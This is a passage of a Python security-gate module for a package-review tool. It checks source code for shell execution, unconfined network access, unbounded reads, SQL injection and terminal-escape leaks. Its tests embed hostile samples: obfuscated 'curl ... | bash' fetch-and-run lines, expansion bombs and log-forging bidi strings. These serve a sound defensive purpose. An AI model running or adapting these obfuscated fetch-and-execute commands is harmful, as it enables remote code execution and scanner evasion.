"""Extracted from security_gates.py: _input_bounds."""

import ast
import contextlib
import io
import re
import time
from scripts.gates._core import Gate, HOSTILE, SRC, _ARTIFACT_MODULES, _ARTIFACT_READ_EXEMPT, _BOUNDED_IO_MODULE, _ENDPOINT_HOST, _FORBIDDEN_CALLS, _MIRROR_HOSTS, _MIRROR_MODULES, _NETWORK_CALLS, _NETWORK_MODULES, _PATH_READ_MODULES, _RELEASE_HOSTS, _RELEASE_MODULES, _URL_LITERAL_RE, _call_name, _enclosing_functions, _hostile_fact, _hostile_result, _python_files, _rel, _render_forget_list, _render_list_rows

__all__ = ['gate_artifact_reads_are_bounded', 'gate_dead_tokenizer_child_fails_the_package', 'gate_every_child_process_gets_an_explicit_environment', 'gate_every_live_regex_is_audited', 'gate_every_stream_read_is_bounded', 'gate_expansion_is_bounded', 'gate_freshness_uses_local_marker', 'gate_git_worker_limit_failures_are_reported', 'gate_git_worker_startup_is_isolated', 'gate_network_is_confined', 'gate_network_reads_are_bounded', 'gate_no_interpreter_calls', 'gate_no_path_based_archive_extraction', 'gate_regex_patterns_pass_adversarial_audit', 'gate_sandbox_core_limit_failure_refuses', 'gate_sandbox_responses_are_capped_before_framing', 'gate_single_network_host', 'gate_sql_is_parameterised', 'gate_terminal_output_is_inert', 'gate_tokenizer_module_is_isolated', 'gate_tokenizer_pool_wait_is_bounded', 'gate_tokenizer_request_writes_are_bounded', 'gate_tokenizer_smoke_is_deterministic', 'gate_tokenizer_worker_limit_failures_are_reported', 'gate_tokenizer_worker_startup_is_isolated', 'gate_untrusted_text_is_sanitised_where_it_is_rendered']

def gate_no_interpreter_calls() -> Gate:
    """No path turns text into code, and nothing is unpickled."""
    hits: list[str] = []
    for path in _python_files():
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                name = _call_name(node)
                if name in _FORBIDDEN_CALLS:
                    hits.append(f"{_rel(path)}:{node.lineno} {name}()")
                if (name.startswith(("os.exec", "os.spawn", "posix_spawn", "pty.spawn", "runpy.run"))
                        or name.split(".")[-1] in {
                            "execv", "execve", "execvp", "execvpe", "fexecve",
                            "spawnv", "spawnve", "spawnvp", "spawnvpe",
                            "posix_spawn", "posix_spawnp",
                        }):
                    hits.append(f"{_rel(path)}:{node.lineno} {name}()")
                if name.endswith("run") or name.endswith("Popen") or name.endswith("call"):
                    for kw in node.keywords:
                        if kw.arg == "shell" and not (
                            isinstance(kw.value, ast.Constant) and kw.value.value is False
                        ):
                            hits.append(f"{_rel(path)}:{node.lineno} shell=")
    return Gate("no interpreter or shell execution", not hits, hits)

def gate_every_child_process_gets_an_explicit_environment() -> Gate:
    """A child process must not inherit the parent's environment.

    Process-startup variables turn "run a child" into "run attacker code":
    ``PYTHONPATH`` makes ``site`` import ``sitecustomize`` at interpreter
    startup (the tokenizer-worker finding), and ``LD_PRELOAD`` /
    ``LD_LIBRARY_PATH`` map an attacker's library into any child, interpreter
    or not (``PERL5LIB``, ``RUBYOPT``, ``BASH_ENV``, ``NODE_OPTIONS`` are the
    per-runtime equivalents).  Every ``subprocess`` call in ``src/`` must pass
    an explicit ``env=`` - in practice ``trustsight.subproc.minimal_env()``.
    """
    calls = {
        "run", "call", "check_call", "check_output", "Popen",
        "execv", "execve", "execvp", "execvpe", "spawnv", "spawnve",
        "spawnvp", "spawnvpe", "posix_spawn", "posix_spawnp", "spawn",
    }
    hits: list[str] = []
    for path in _python_files():
        tree = ast.parse(path.read_text(encoding="utf-8"))
        imported: dict[str, str] = {}
        for node in ast.walk(tree):
            if isinstance(node, ast.ImportFrom):
                prefix = node.module or ""
                for alias in node.names:
                    imported[alias.asname or alias.name] = f"{prefix}.{alias.name}".strip(".")
            elif isinstance(node, ast.Import):
                for alias in node.names:
                    imported[alias.asname or alias.name] = alias.name
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            raw = _call_name(node)
            name = raw.split(".")[-1]
            resolved = imported.get(raw, imported.get(raw.split(".")[0], raw))
            if name not in calls and resolved.split(".")[-1] not in calls:
                continue
            if not any(kw.arg == "env" for kw in node.keywords):
                hits.append(f"{_rel(path)}:{node.lineno} {raw} without env=")
    return Gate("every child process gets an explicit environment", not hits,
                hits)

def gate_network_is_confined() -> Gate:
    """Only the listed fetch and notify modules may import or open a connection.

    Both halves matter.  A call-name check alone misses ``requests.get`` and
    an aliased ``from urllib.request import urlopen as fetch``; an import
    check alone misses a transport reached through a helper.  Enumerating
    imports also keeps a future module from opening a socket without ever
    spelling one of the four names the old gate knew.
    """
    hits: list[str] = []
    banned_imports = {
        "urllib.request", "http.client", "socket", "requests", "httpx",
        "aiohttp", "ftplib", "telnetlib",
    }
    for path in _python_files():
        rel = path.relative_to(SRC).as_posix()
        tree = ast.parse(path.read_text(encoding="utf-8"))
        allowed = rel in _NETWORK_MODULES
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    if alias.name in banned_imports and not allowed:
                        hits.append(f"{_rel(path)}:{node.lineno} import {alias.name}")
            elif isinstance(node, ast.ImportFrom):
                module = node.module or ""
                if module in banned_imports and not allowed:
                    hits.append(f"{_rel(path)}:{node.lineno} from {module}")
                elif module == "urllib" and any(a.name == "request" for a in node.names) and not allowed:
                    hits.append(f"{_rel(path)}:{node.lineno} from urllib import request")
                elif module == "http" and any(a.name == "client" for a in node.names) and not allowed:
                    hits.append(f"{_rel(path)}:{node.lineno} from http import client")
            if not isinstance(node, ast.Call) or allowed:
                continue
            name = _call_name(node).split(".")[-1]
            if name in _NETWORK_CALLS:
                hits.append(f"{_rel(path)}:{node.lineno} {name}()")
    return Gate("network confined to the fetch modules", not hits, hits)

#: Documentation/template modules carry example URLs that are never fetched.
#: Documentation/template modules carry example URLs that are never fetched.
_HOST_LITERAL_EXEMPT_MODULES = frozenset({
    "config/_default_config.py", "config/_default_rules.py",
})

#: Public documentation links are prose, never fetch targets.
_DOCUMENTATION_HOSTS = frozenset({"docs.trustsight.org"})


def _url_constants(node: ast.AST):
    """Yield every string carrying an http(s) URL in an assignment/f-string."""
    if isinstance(node, ast.Constant) and isinstance(node.value, str):
        yield node.value
    elif isinstance(node, ast.JoinedStr):
        for value in node.values:
            if isinstance(value, ast.Constant) and isinstance(value.value, str):
                yield value.value


def gate_single_network_host() -> Gate:
    """Every endpoint URL names a declared host, whatever the variable is called.

    The earlier name filter (``*URL``) was itself the seam: ``AUR_ENDPOINT``
    or a dynamically named base could carry a new host and stay invisible.
    Scan the string value instead, including literal parts of f-strings, and
    keep the declared-host/module pairs as the only exceptions.
    """
    hits: list[str] = []
    found = set()
    for path in _python_files():
        rel = path.relative_to(SRC).as_posix()
        if rel in _HOST_LITERAL_EXEMPT_MODULES:
            continue
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if not isinstance(node, (ast.Assign, ast.AnnAssign)):
                continue
            value = node.value
            if value is None:
                continue
            for text in _url_constants(value):
                for host in _URL_LITERAL_RE.findall(text):
                    found.add(host)
                    if host == _ENDPOINT_HOST:
                        continue
                    if host in _DOCUMENTATION_HOSTS:
                        continue
                    if host in _MIRROR_HOSTS and rel in _MIRROR_MODULES:
                        continue
                    if host in _RELEASE_HOSTS and rel in _RELEASE_MODULES:
                        continue
                    hits.append(f"{_rel(path)}:{node.lineno} {host}")
    if not found:
        hits.append("no endpoint constant found: the check is not looking at anything")
    return Gate("one network host, declared", not hits, hits or sorted(found))

def gate_network_reads_are_bounded() -> Gate:
    """Every outbound request carries an explicit timeout."""
    hits: list[str] = []
    for path in _python_files():
        if path.relative_to(SRC).as_posix() not in _NETWORK_MODULES:
            continue
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            if _call_name(node).split(".")[-1] not in ("urlopen", "urlretrieve"):
                continue
            if not any(kw.arg == "timeout" for kw in node.keywords):
                hits.append(f"{_rel(path)}:{node.lineno} no timeout=")
    return Gate("every request has a timeout", not hits, hits)

def gate_no_path_based_archive_extraction() -> Gate:
    """No archive member is written to a path the archive chose.

    Narrower than "archives are never extracted", which is what this used
    to be called, and which was broader than both the check and the truth:
    the seed importer does write members to disk (``db._extract_v2_archive``),
    under an explicit containment guard.  What is banned is handing a
    member's own name to the extractor, because that is the path-traversal
    primitive; a manual write under a checked name is a different thing and
    A8 now says so.
    """
    hits: list[str] = []
    for path in _python_files():
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                name = _call_name(node).split(".")[-1]
                # tarfile.extractfile returns a file-like object and does not
                # write to disk; only path-based extraction is prohibited.
                if name in ("extract", "extractall", "unpack_archive"):
                    hits.append(f"{_rel(path)}:{node.lineno} {name}()")
    return Gate("no path-based archive extraction", not hits, hits)

def gate_every_stream_read_is_bounded() -> Gate:
    """A4/A14: a read with no size is the other end choosing the size.

    Structural over the whole source rather than pointed at the sites that
    were wrong, because the recurring failure here is a control applied at
    one of several equivalent call sites.  ``extractfile().read()`` honours
    the member's declared size, which is the attacker's number: a member
    declaring thirty gigabytes is allocated in full, and a 32 MiB gzip on
    compressible content is enough to declare it.  So the bound belongs on
    the read, and a size argument is what this looks for.
    """
    hits: list[str] = []
    checked = 0
    for path in _python_files():
        if path.name == _BOUNDED_IO_MODULE:
            continue
        tree = ast.parse(path.read_text(encoding="utf-8"))
        path_owned = path.relative_to(SRC).as_posix() in _PATH_READ_MODULES
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            if not isinstance(node.func, ast.Attribute):
                continue
            if node.func.attr == "read":
                checked += 1
                if not node.args and not node.keywords:
                    hits.append(f"{_rel(path)}:{node.lineno} unbounded read()")
            elif path_owned and node.func.attr in ("read_text", "read_bytes"):
                hits.append(
                    f"{_rel(path)}:{node.lineno} unbounded {node.func.attr}()")
    # The cache's only way to read an entry is the capped helper; a later
    # refactor back to ``path.read_text`` would otherwise still leave the
    # module in the set above with nothing to flag.
    if "read_file_capped(" not in (SRC / "doc_cache.py").read_text(encoding="utf-8"):
        hits.append("doc_cache.py does not use read_file_capped")
    return Gate("every stream read is bounded", not hits,
                hits or f"{checked} read() calls, all sized; document cache "
                "reads through read_file_capped")

def gate_artifact_reads_are_bounded() -> Gate:
    """A4: an artifact is bounded before it is materialised, not after.

    A signature is computed over the bytes, so verification cannot run
    until they have been read: the bound sits in front of the check, or it
    guards nothing.  The same applies to a digest recorded for attribution
    (A12) and to a gzip cap that only ever sees an already-materialised
    buffer.
    """
    problems: list[str] = []
    covered: list[str] = []
    for rel in _ARTIFACT_MODULES:
        path = SRC / rel
        if not path.exists():
            problems.append(f"{rel} is missing")
            continue
        covered.append(rel)
        tree = ast.parse(path.read_text(encoding="utf-8"))
        owner = _enclosing_functions(tree)
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            if not isinstance(node.func, ast.Attribute):
                continue
            if node.func.attr not in ("read_bytes", "read_text"):
                continue
            if owner.get(node.lineno) in _ARTIFACT_READ_EXEMPT:
                continue
            problems.append(
                f"{rel}:{node.lineno} unbounded {node.func.attr}() "
                f"in {owner.get(node.lineno, '<module>')}"
            )
    return Gate("artifact reads are bounded before verification", not problems,
                problems or covered)

def gate_sql_is_parameterised() -> Gate:
    """No SQL string is assembled from an expression.

    SQLite cannot bind a table or column name, so a handful of statements
    interpolate an *identifier* taken from a bare local that iterates a
    literal list in the same module (the schema-migration loop, the
    forget-package sweep, the seed's placeholder run).  Those are allowed,
    and they are the only allowed form: an interpolated attribute,
    subscript, call or concatenation is a value reaching the statement
    text, which is what parameters exist to prevent.
    """
    hits: list[str] = []
    for path in _python_files():
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            if _call_name(node).split(".")[-1] not in ("execute", "executemany", "executescript"):
                continue
            if not node.args:
                continue
            sql = node.args[0]
            if isinstance(sql, ast.JoinedStr):
                # An f-string in SQL is only acceptable for an identifier
                # chosen from a literal list in the same module.  A bare Name
                # is not proof of that: `table` may be anything.  The explicit
                # allowlist is the reviewed set; adding a name is a deliberate
                # change with this gate in view.
                safe_names = {
                    "table", "source_table", "where", "placeholders",
                    "name", "decl", "_SCHEMA_VERSION",
                }
                for value in sql.values:
                    if not isinstance(value, ast.FormattedValue):
                        continue
                    if isinstance(value.value, ast.Name) and value.value.id in safe_names:
                        continue
                    hits.append(f"{_rel(path)}:{node.lineno} computed SQL")
                    break
            elif isinstance(sql, ast.BinOp):
                hits.append(f"{_rel(path)}:{node.lineno} concatenated SQL")
    return Gate("SQL is parameterised", not hits, hits)

def gate_terminal_output_is_inert() -> Gate:
    """No renderer lets a hostile package write escapes to the terminal.

    *Every* render path, not one of them.  The first version of this gate
    exercised ``review``'s Rich renderer alone and passed while
    ``_inspect_rich`` leaked escape sequences through an unsanitised rule
    id, which is the failure mode described in
    [reviewing a security control](../docs/contributing/security-review.md):
    a control applied at one of several equivalent call sites, with the
    check pointed at a covered one.
    """

    from unittest.mock import patch

    from rich.console import Console

    import trustsight.cli.corpus as corpus_cli
    import trustsight.cli.display as display
    import trustsight.cli.explain as explain_cli
    import trustsight.cli.forget as forget_cli
    import trustsight.cli.inspect as inspect_cli
    import trustsight.cli.review as review
    from trustsight.cli.inspect import _render as inspect_render

    fact, result = _hostile_fact(), _hostile_result()

    hostile_explanation = {
        "analysis": {
            "id": 1, "timestamp": HOSTILE, "package": HOSTILE,
            "old_version": HOSTILE, "new_version": HOSTILE,
            "old_commit": HOSTILE, "new_commit": HOSTILE,
            "config_fingerprint": HOSTILE, "coverage_gaps": [HOSTILE],
            "suppressed_rules": [{
                "rule_id": HOSTILE, "override_package": HOSTILE,
                "override_reason": HOSTILE,
            }],
        },
        "finding": {"description": HOSTILE, "file": HOSTILE, "line": 1,
                    "note": HOSTILE},
        "lines": [{"raw": HOSTILE, "old_lineno": 1, "new_lineno": 2}],
        "external_input": HOSTILE, "external_value": HOSTILE,
    }

    # The first-contact panel is DB-backed, so on a cold database it renders
    # empty and the hostile value never reaches the renderer - the gate would
    # pass without ever exercising the path.  Pin a hostile record so the
    # panel is covered on every run, warm or cold.
    hostile_panel = {
        "available": True, "note": "",
        "records": [{"kind": "host", "value": HOSTILE, "basis": "ledger"}],
    }

    def with_hostile_panel(fn) -> str:
        with patch.object(inspect_render, "contact_panel", return_value=hostile_panel):
            return fn()

    def rich(fn) -> str:
        buffer = io.StringIO()
        saved = display._console
        display._console = Console(file=buffer, force_terminal=False, width=200)
        try:
            fn()
        finally:
            display._console = saved
        return buffer.getvalue()

    def plain(fn) -> str:
        buffer = io.StringIO()
        with contextlib.redirect_stdout(buffer):
            fn()
        return buffer.getvalue()

    def corpus_log() -> str:
        """The full-aur progress log is a render path too.

        It prints a cluster finding's ``match`` verbatim, and that string
        carries the gained host, maintainer or dependency the rule joined on.
        A logger that does not clean would let a package repaint the
        watcher's terminal from a finding line (A10).
        """
        import trustsight.full_aur.pipeline as pipeline

        buffer = io.StringIO()

        class _Recorder:
            def info(self, msg, *args):
                buffer.write(msg % args if args else str(msg))

            warning = info

            def debug(self, *args, **kwargs):
                pass

        saved = pipeline.log
        pipeline.log = _Recorder()
        try:
            pipeline._logger(False)(
                f"  G001 (HIGH) Shared Gained Host: gained host {HOSTILE}"
            )
        finally:
            pipeline.log = saved
        return buffer.getvalue()

    def stderr_log() -> str:
        """The CLI's general log handler is the other log render path.

        ``full_aur._logger`` covers the corpus progress sink; every other
        ``log.warning``/``info`` record goes through ``_StderrHandler``.  A
        record's message and its traceback can both carry input-controlled
        text, and the handler must render both inert without turning one
        value into two log lines (A10).
        """
        import logging
        import sys

        from trustsight.cli.app import _StderrHandler

        buffer = io.StringIO()
        saved = sys.stderr
        sys.stderr = buffer
        try:
            handler = _StderrHandler()
            handler.setFormatter(logging.Formatter("%(message)s"))
            handler.emit(logging.LogRecord(
                "trustsight.gate", logging.WARNING, __file__, 1,
                "hostile %s", (HOSTILE + "\u202e\nforged verdict",), None))
        finally:
            sys.stderr = saved
        return buffer.getvalue()

    def ioc_plain() -> str:
        """The plain IOC table is a separate renderer from the Rich table."""
        from trustsight.cli.ioc import ioc_list
        from trustsight.ioc_baseline import IocEntry

        entry = IocEntry(type="package", value=HOSTILE, source=HOSTILE)
        with patch("trustsight.ioc_baseline.active_iocs", return_value=[entry]), \
                patch("trustsight.cli.ioc.use_rich", return_value=False):
            return plain(lambda: ioc_list(
                source=None, type=None, include_expired=False, json_output=False))

    renders = {
        "review rich": lambda: rich(
            lambda: review._render_results_rich([result], 1, False, True, True, False)),
        "inspect rich": lambda: with_hostile_panel(lambda: rich(
            lambda: inspect_cli._inspect_rich(fact, show_score=True, show_risk=True))),
        "inspect plain": lambda: with_hostile_panel(lambda: plain(
            lambda: inspect_cli._inspect_plain(fact, show_score=True, show_risk=True))),
        # forget/history/list were outside this gate entirely, and
        # forget echoed DB-stored package names raw.  Every surface that
        # prints attacker-influenced text belongs here, not the three that
        # were convenient to construct.
        "forget list": lambda: plain(lambda: _render_forget_list([HOSTILE])),
        "list table": lambda: rich(lambda: _render_list_rows([{
            "name": HOSTILE, "version": "1.0", "last_checked": "2026-01-01",
            "score": 40, "risk": "Medium", "maintainer": HOSTILE,
        }])),
        "corpus pivot": lambda: rich(lambda: corpus_cli._render_pivot({
            "indicator": HOSTILE, "type": "host", "listed": True,
            "confidence": HOSTILE, "sources": ["corpus"],
            "matches": [{"package": HOSTILE, "surface": HOSTILE, "detail": HOSTILE}],
        })),
        "explain plain": lambda: plain(lambda: explain_cli.render_explanation_plain(
            hostile_explanation, "R001", HOSTILE, hostile_explanation["finding"], {
                "severity": HOSTILE, "match_target": HOSTILE, "pattern": HOSTILE,
            })),
        "explain history plain": lambda: plain(
            lambda: explain_cli.render_history_explanation_plain(
                hostile_explanation, "R001")),
        "forget removal list": lambda: plain(
            lambda: forget_cli.render_removal_list([HOSTILE])),
        "corpus sweep log": corpus_log,
        "stderr log handler": stderr_log,
        "ioc plain": ioc_plain,
    }

    problems = []
    for name, run in renders.items():
        try:
            out = run()
        except Exception as exc:  # a crash is also a way to lose the batch
            problems.append(f"{name}: raised {type(exc).__name__}")
            continue
        if "\x1b" in out or "\x9b" in out:
            problems.append(f"{name}: escape sequence reached the terminal")
        if "VERDICT: CLEAN" in out and "[bold red]" not in out:
            problems.append(f"{name}: markup was interpreted, not printed")
        if name == "stderr log handler":
            if out.count("\n") != 1:
                problems.append(f"{name}: a value forged an extra log line")
            if any(ch in out for ch in (
                    "\u202a", "\u202b", "\u202c", "\u202d", "\u202e",
                    "\u2066", "\u2067", "\u2068", "\u2069")):
                problems.append(f"{name}: bidi control reached the terminal")
    return Gate("terminal output is inert", not problems,
                problems or sorted(renders))

def gate_freshness_uses_local_marker() -> Gate:
    """A11: a package-supplied timestamp cannot override a local freshness marker.

    ``_is_current`` in ``sandbox/git_project.py`` must read the local marker
    (``last_fetch_time``) before consulting the HEAD commit time.
    The commit-time path is a fallback for clones that predate the marker
    and must only execute when the marker is absent.
    """
    fetcher = SRC / "sandbox" / "git_project.py"
    tree = ast.parse(fetcher.read_text(encoding="utf-8"))
    problems: list[str] = []

    # Find _is_current function.
    is_current = None
    for node in ast.walk(tree):
        if isinstance(node, ast.FunctionDef) and node.name == "_is_current":
            is_current = node
            break
    if is_current is None:
        return Gate("freshness uses local marker", False,
                    "_is_current not found in git_project.py")

    # The function body must reference last_fetch_time.
    has_marker = False
    has_commit_time = False
    for node in ast.walk(is_current):
        if isinstance(node, ast.Call) and _call_name(node) == "last_fetch_time":
            has_marker = True
        if isinstance(node, ast.Attribute) and node.attr == "commit_time":
            has_commit_time = True

    if not has_marker:
        problems.append("_is_current does not call last_fetch_time")
    if not has_commit_time:
        problems.append("_is_current does not reference commit_time (fallback removed?)")

    # The commit_time access must follow the marker check.  The pattern is:
    #   fetched = last_fetch_time(repo)
    #   if fetched is not None:
    #       ... return True ...
    #   # fallback: commit.commit_time >= upstream_mtime
    # We verify that an If node in the body guards on the variable that
    # last_fetch_time assigned to, and that commit_time appears only after
    # that If block.
    if has_marker and has_commit_time:
        body = is_current.body
        found_marker_guard = False
        marker_var = None
        # Walk the top-level body looking for the pattern:
        #   <var> = last_fetch_time(...)
        #   if <var> is not None: ...
        for i, stmt in enumerate(body):
            # Look for: var = last_fetch_time(repo)
            if (isinstance(stmt, ast.Assign)
                    and len(stmt.targets) == 1
                    and isinstance(stmt.targets[0], ast.Name)):
                call = stmt.value
                if (isinstance(call, ast.Call)
                        and _call_name(call) == "last_fetch_time"):
                    marker_var = stmt.targets[0].id
                    # Check that the next statement is an If guarding on this var.
                    if i + 1 < len(body) and isinstance(body[i + 1], ast.If):
                        if_node = body[i + 1]
                        # The test should reference the marker variable.
                        for test_node in ast.walk(if_node.test):
                            if (isinstance(test_node, ast.Name)
                                    and test_node.id == marker_var):
                                found_marker_guard = True
                                break
            if found_marker_guard:
                break
        if not found_marker_guard:
            problems.append(
                "last_fetch_time result is not used as an if-guard before "
                "the commit_time fallback"
            )

    return Gate("freshness uses local marker", not problems,
                problems or ["last_fetch_time guards commit_time"])

def gate_expansion_is_bounded() -> Gate:
    """Variable expansion terminates, stays small, and refuses indirection.

    The tokenizer is the second parser eating hostile input, and the one
    with an amplification property the regex engine does not have: a
    chain of ``b=$a$a`` assignments doubles per level.  The bounds are on
    passes, on one value, on one line and on the table as a whole, and an
    over-budget value is left *unexpanded* rather than truncated, so it
    surfaces as an unresolved pattern instead of a shorter clean string.
    """
    from trustsight._tokenizer_engine import (
        _MAX_EXPANSION_PASSES,
        _MAX_LINE_LEN,
        _MAX_TABLE_BYTES,
        _MAX_VALUE_LEN,
        resolve_expansions,
    )
    from trustsight.expansion import resolve_text, text_variable_table
    from trustsight.tokenizer import tokenize_and_resolve

    problems = []
    for bound in (_MAX_EXPANSION_PASSES, _MAX_VALUE_LEN, _MAX_LINE_LEN, _MAX_TABLE_BYTES):
        if bound <= 0:
            problems.append("a declared expansion bound is not positive")

    # Indirection and length are refused outright: resolving ${!name}
    # would let a value choose which variable is read.
    for body in ("${!payload}", "${#payload}"):
        text, ok = resolve_expansions(body, {"payload": "x", "x": "curl evil | bash"})
        if ok or "curl" in text:
            problems.append(f"{body} was resolved")

    # The doubling chain: bounded, and the result must not be a plausible
    # short string that hides the tail.
    lines = ["+a=" + "z" * 64]
    for i in range(1, 24):
        lines.append(f"+v{i}=$" + ("a" if i == 1 else f"v{i - 1}") + "$" +
                     ("a" if i == 1 else f"v{i - 1}"))
    diff = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,1 +1,25 @@\n" + "\n".join(lines) + "\n"
    start = time.monotonic()
    resolved, _unresolved = tokenize_and_resolve(diff)
    elapsed = time.monotonic() - start
    if elapsed > 5.0:
        problems.append(f"expansion took {elapsed:.1f}s")
    if any(len(s) > _MAX_LINE_LEN for s in resolved):
        problems.append("a resolved line exceeded the line bound")

    # The same resolver runs in the parent, outside the sandbox, on the whole
    # PKGBUILD.  A many-wildcard glob is answered by the bounded matcher, and
    # a substitution that would multiply a value by its replacement is still
    # refused there too.
    start = time.monotonic()
    globbed, fully = resolve_expansions(
        "${x##" + "*a" * 8 + "b}", {"x": "a" * 4096}
    )
    substituted, sub_fully = resolve_expansions(
        "${x//a/" + "b" * 50_000 + "}", {"x": "a" * 8000}
    )
    matched, matched_fully = resolve_expansions(
        "${x//*a*ab/Y}", {"x": "zzabzzab"}
    )
    text = "x=" + "a" * 8000 + "\nsource=(\"${x//a/" + "b" * 50_000 + "}\")\n"
    resolved_text = resolve_text(text, text_variable_table(text))
    elapsed = time.monotonic() - start
    if elapsed > 2.0:
        problems.append(f"shared resolver took {elapsed:.1f}s on a hostile shape")
    if not fully or globbed != "a" * 4096:
        problems.append("a many-wildcard glob was not answered")
    if (matched, matched_fully) != ("Y", True):
        problems.append("a multi-star glob did not use table matching")
    if sub_fully or substituted != "${x//a/" + "b" * 50_000 + "}":
        problems.append("an oversized substitution was not refused")
    if resolved_text != text:
        problems.append("the parent resolver changed oversized input")

    return Gate("expansion is bounded and never indirect", not problems, problems)

def gate_regex_patterns_pass_adversarial_audit() -> Gate:
    """All shipped/configured regexes stay within the bounded risk budget."""
    from scripts.regex_audit import audit_patterns

    audits = audit_patterns()
    failures = [audit.source for audit in audits if not audit.passed]
    return Gate(
        "regex patterns pass adversarial audit",
        not failures,
        failures or f"{len(audits)} patterns audited",
    )

def gate_every_live_regex_is_audited() -> Gate:
    """A14: the audit's *coverage*, not just its verdict.

    The audit used to collect ``re.compile("literal")`` out of the AST, so
    a pattern assembled from parts was skipped in silence: 44 of 246, 18%,
    concentrated in the modules with the most shared prefixes. A gate that
    passes because it never looked is the failure this codebase keeps
    finding, so coverage is asserted rather than assumed.  Literal patterns
    passed straight to ``re.match/search/...`` were a third blind spot: they
    are compiled implicitly by the ``re`` cache, not by ``re.compile``.
    """
    import importlib

    from scripts.regex_audit import _inline_patterns, audit_patterns

    audited = {audit.pattern for audit in audit_patterns()}

    missing: list[str] = []
    for source, pattern, _method in _inline_patterns():
        if pattern not in audited:
            missing.append(source)
    for path in sorted(SRC.rglob("*.py")):
        parts = [
            part
            for part in path.relative_to(SRC).with_suffix("").parts
            if part != "__init__"
        ]
        if not parts or parts[0] == "cli" or "__main__" in parts:
            continue
        name = "trustsight." + ".".join(parts)
        try:
            module = importlib.import_module(name)
        except Exception:
            continue
        for attr, value in vars(module).items():
            candidates = (
                [value]
                if isinstance(value, re.Pattern)
                else list(value)
                if isinstance(value, (list, tuple, frozenset, set))
                else []
            )
            for item in candidates:
                if isinstance(item, re.Pattern) and item.pattern not in audited:
                    missing.append(f"{name}.{attr}")

    # Rules whose pattern is generated at match time are invisible to all
    # three collection strategies at once: not a TOML literal, not a
    # `re.compile("literal")` in the source, and not a module-level
    # `re.Pattern`. R013 is the FATAL homoglyph rule.
    import tomllib

    from trustsight.config import DEFAULT_RULES
    from trustsight.rules import GENERATED_PATTERN_RULES, resolve_generated_patterns

    generated = tomllib.loads(DEFAULT_RULES).get("rules", [])
    resolve_generated_patterns(generated)
    for rule in generated:
        if rule.get("id") in GENERATED_PATTERN_RULES:
            if rule.get("pattern") not in audited:
                missing.append(f"generated rule {rule['id']}")

    return Gate(
        "every live regex is audited",
        not missing,
        missing or f"{len(audited)} distinct patterns cover every live object",
    )

def gate_untrusted_text_is_sanitised_where_it_is_rendered() -> Gate:
    """A1/B7: printed evidence cannot repaint the screen or abort a render.

    `safe_text.clean` is the boundary function. Two render paths used
    `unicode.strip_ansi` instead, which removes CSI sequences and leaves C1
    control bytes, BEL and newlines - and `\x9b2J` is the 8-bit spelling of
    "clear the screen". A third passed federated IOC values to Rich as bare
    strings, where `[/]` raises `MarkupError` and aborts the whole table.

    Checked on calls and imports rather than on the substring, so a comment
    explaining the rule does not trip it.
    """
    cli = SRC / "cli"
    problems: list[str] = []

    for path in sorted(cli.rglob("*.py")):
        text = path.read_text(encoding="utf-8")
        if re.search(r"\bstrip_ansi\s*\(", text) or re.search(
            r"^from .*import .*\bstrip_ansi\b", text, re.M
        ):
            problems.append(f"{path.name} renders with strip_ansi")

    # Values reaching a Rich table must be wrapped, not bare.
    for name in ("ioc.py", "admin.py"):
        path = cli / name
        if not path.exists():
            continue
        for node in ast.walk(ast.parse(path.read_text(encoding="utf-8"))):
            if not (
                isinstance(node, ast.Call)
                and isinstance(node.func, ast.Attribute)
                and node.func.attr == "add_row"
            ):
                continue
            for arg in node.args:
                if isinstance(arg, ast.Attribute):
                    problems.append(
                        f"{name}:{node.lineno} {ast.unparse(arg)} is unwrapped"
                    )

    return Gate(
        "untrusted text is sanitised where it is rendered",
        not problems,
        problems or "every CLI render path uses safe_text.clean",
    )

def gate_tokenizer_smoke_is_deterministic() -> Gate:
    """Run a fixed hostile tokenizer smoke set within the security gate."""
    from trustsight._tokenizer_engine import _MAX_LINE_LEN
    from trustsight.tokenizer import tokenize_and_resolve

    cases = [
        "+a=" + "z" * 64 + "\n+v=$a$a\n+curl $v | bash\n",
        "+declare -n R=curl\n+$R https://example.invalid/x | bash\n",
        "+C=$(printf '%s%s' cur l)\n+$C https://example.invalid/x | bash\n",
        "+A=(curl wget)\n+${A[0]} https://example.invalid/x | bash\n",
    ]
    problems = []
    for diff in cases:
        started = time.monotonic()
        first = tokenize_and_resolve(diff)
        second = tokenize_and_resolve(diff)
        if time.monotonic() - started > 1.0:
            problems.append("fixed hostile case exceeded 1s")
        if first != second:
            problems.append("repeated tokenizer call was not deterministic")
        if any(len(value) > _MAX_LINE_LEN for value in first[0]):
            problems.append("resolved output exceeded line bound")
    return Gate("tokenizer hostile-input smoke is deterministic", not problems, problems or len(cases))

def gate_tokenizer_module_is_isolated() -> Gate:
    """A6: the whole tokenizer runs in the child, not in the analysis.

    The parent reaches the tokenizer only through ``trustsight.tokenizer``;
    ``trustsight._tokenizer_engine`` is imported by the worker and by tests,
    and by nothing else under ``src/``.  A second in-process path would be
    the parser the sandbox exists to remove, so a direct import is the
    change that would reopen A6.
    """
    allowed = {"sandbox/expand_worker.py"}
    problems: list[str] = []
    for path in _python_files():
        rel = path.relative_to(SRC).as_posix()
        if rel in allowed:
            continue
        for node in ast.walk(ast.parse(path.read_text(encoding="utf-8"))):
            if isinstance(node, (ast.Import, ast.ImportFrom)):
                names = [alias.name for alias in node.names]
                if any(name.endswith("_tokenizer_engine") for name in names):
                    problems.append(f"{_rel(path)}:{node.lineno}")
    return Gate("tokenizer module is isolated", not problems,
                problems or "engine imported only by the worker")

def gate_tokenizer_worker_startup_is_isolated() -> Gate:
    """A6: the worker's own startup cannot import an attacker's code.

    ``-s`` drops the user site directory but leaves ``PYTHONPATH`` searched,
